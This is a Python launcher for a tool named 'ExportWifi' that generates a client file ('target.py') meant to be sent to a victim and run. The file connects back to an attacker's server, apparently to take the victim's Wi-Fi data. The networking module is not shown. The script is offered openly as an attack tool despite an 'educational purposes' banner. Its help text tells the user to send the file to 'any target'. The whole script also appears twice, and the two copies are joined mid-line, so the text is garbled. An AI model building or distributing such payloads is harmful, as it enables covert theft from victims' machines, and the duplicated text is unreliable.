from ExportWifi import WlanServer
import sys
import random
import os

lst = sys.argv
gui = """
___________                             __   __      __.__  _____.__ 
\_   _____/__  _________   ____________/  |_/  \    /  \__|/ ____\__|
 |    __)_\  \/  /\____ \ /  _ \_  __ \   __\   \/\/   /  \   __\|  |
 |        \>    < |  |_> >  <_> )  | \/|  |  \        /|  ||  |  |  |
/_______  /__/\_ \|   __/ \____/|__|   |__|   \__/\  / |__||__|  |__|
        \/      \/|__|                             \/                

        ~Created by: Kill0ger~
        REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES  
        SO DON'T USE THIS FOR EVIL ACTIVITIES !!!!!     
        
        THANK YOU FOR USING EXPORTWIFI   
"""
try:
    if "-aip" in lst:
        idx = lst.index("-aip")
        try:
            ip = str(lst[idx +1])
            numbers = "1 2 3 4 5 6 7 8 9 0".split()
            port_number = int("".join(random.sample(numbers, 4)))

            if "-ds" in lst:
                try:
                    data = f"""
from ExportWifi import WlanServer
server = WlanServer('{ip}', {port_number})
server.start()

"""
                    if os.path.exists("demon_server.py"):
                        os.remove("demon_server.py")

                    with open("demon_server.py", "a+") as file:
                        file.write(data)
                    print('"demon_server.py" has been created')
                except IndexError:
                    print(gui)
                    quit()

            if "-p" in lst: #"p" stands for ports
                idx_port = lst.index("-p")
                try:
                    print('HERE IS THE PORT NUMBER OF THE SERVER')
                    print(f"\nport = {port_number}")

                except IndexError:
                    print(gui)
                    quit()

            if "-cf" in lst: #"cf" stands for Create file
                idx_cf = lst.index("-cf")
                try:
                    filename = lst[idx_cf + 1]
                    if not filename.endswith("py"):
                        data = filename.split(".")
                        filename = f"{data[0]}.py"
                    if "-" in filename:
                        filename = "target.py"

                    if os.path.exists(filename):
                        os.remove(filename)

                    with open(f"{filename}", "a+") as file:
                        file.write(f'import ExportWifi as wifi \n\nclient = wifi.WlanClient("{ip}", {port_number})\nclient.start()')
                    print(f"{filename.upper()} has been created")

                except IndexError:
                    with open("target.py", "a+") as file:
                        file.write(f'import ExportWifi as wifi \n\nclient = wifi.WlanClient("{ip}", {port_number})\nclient.start()')
                    print("TARGET.PY HAS BEEN CREATED YOU CAN SEND THIS TO YOUR TARGET")

            server = WlanServer(ip, port_number)
            server.start()
        except IndexError:
            print(gui)
            print("INSERT AN IP-ADDRESS")

    if "-help" in lst:
        print(gui)
        print("\n-aip INSERT THE SERVERS IP\n-cf  CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET\n-p   SAVES ALL THE PORTS OF THE CURRENT SERVER\n-ds  CREATES A SERVER WITH THE SAME PORTS AS THE TARGET")

    if "-aip" not in lst:
        print(gui)
        print("YOU MUST SPECIFY YOUR IP-ADDRESS WITH '-aip'. IF YOU NEED HELP SIMPLY TYPE 'python wifi.py -help'")

    if len(lst) == 1:
        print(gui)
        print("IF YOU NEED HELP SIMPLY TYPE 'python wifi.py -help'")

except OSError:
    print(gui)
    print("CHECK YOUR IP-ADDRESS")from ExportWifi import WlanServer
import sys
import random
import os

lst = sys.argv
gui = """
___________                             __   __      __.__  _____.__ 
\_   _____/__  _________   ____________/  |_/  \    /  \__|/ ____\__|
 |    __)_\  \/  /\____ \ /  _ \_  __ \   __\   \/\/   /  \   __\|  |
 |        \>    < |  |_> >  <_> )  | \/|  |  \        /|  ||  |  |  |
/_______  /__/\_ \|   __/ \____/|__|   |__|   \__/\  / |__||__|  |__|
        \/      \/|__|                             \/                

        ~Created by: Kill0ger~
        REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES  
        SO DON'T USE THIS FOR EVIL ACTIVITIES !!!!!     
        
        THANK YOU FOR USING EXPORTWIFI   
"""
try:
    if "-aip" in lst:
        idx = lst.index("-aip")
        try:
            ip = str(lst[idx +1])
            numbers = "1 2 3 4 5 6 7 8 9 0".split()
            port_number = int("".join(random.sample(numbers, 4)))

            if "-ds" in lst:
                try:
                    data = f"""
from ExportWifi import WlanServer
server = WlanServer('{ip}', {port_number})
server.start()

"""
                    if os.path.exists("demon_server.py"):
                        os.remove("demon_server.py")

                    with open("demon_server.py", "a+") as file:
                        file.write(data)
                    print('"demon_server.py" has been created')
                except IndexError:
                    print(gui)
                    quit()

            if "-p" in lst: #"p" stands for ports
                idx_port = lst.index("-p")
                try:
                    print('HERE IS THE PORT NUMBER OF THE SERVER')
                    print(f"\nport = {port_number}")

                except IndexError:
                    print(gui)
                    quit()

            if "-cf" in lst: #"cf" stands for Create file
                idx_cf = lst.index("-cf")
                try:
                    filename = lst[idx_cf + 1]
                    if not filename.endswith("py"):
                        data = filename.split(".")
                        filename = f"{data[0]}.py"
                    if "-" in filename:
                        filename = "target.py"

                    if os.path.exists(filename):
                        os.remove(filename)

                    with open(f"{filename}", "a+") as file:
                        file.write(f'import ExportWifi as wifi \n\nclient = wifi.WlanClient("{ip}", {port_number})\nclient.start()')
                    print(f"{filename.upper()} has been created")

                except IndexError:
                    with open("target.py", "a+") as file:
                        file.write(f'import ExportWifi as wifi \n\nclient = wifi.WlanClient("{ip}", {port_number})\nclient.start()')
                    print("TARGET.PY HAS BEEN CREATED YOU CAN SEND THIS TO YOUR TARGET")

            server = WlanServer(ip, port_number)
            server.start()
        except IndexError:
            print(gui)
            print("INSERT AN IP-ADDRESS")

    if "-help" in lst:
        print(gui)
        print("\n-aip INSERT THE SERVERS IP\n-cf  CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET\n-p   SAVES ALL THE PORTS OF THE CURRENT SERVER\n-ds  CREATES A SERVER WITH THE SAME PORTS AS THE TARGET")

    if "-aip" not in lst:
        print(gui)
        print("YOU MUST SPECIFY YOUR IP-ADDRESS WITH '-aip'. IF YOU NEED HELP SIMPLY TYPE 'python wifi.py -help'")

    if len(lst) == 1:
        print(gui)
        print("IF YOU NEED HELP SIMPLY TYPE 'python wifi.py -help'")

except OSError:
    print(gui)
    print("CHECK YOUR IP-ADDRESS")
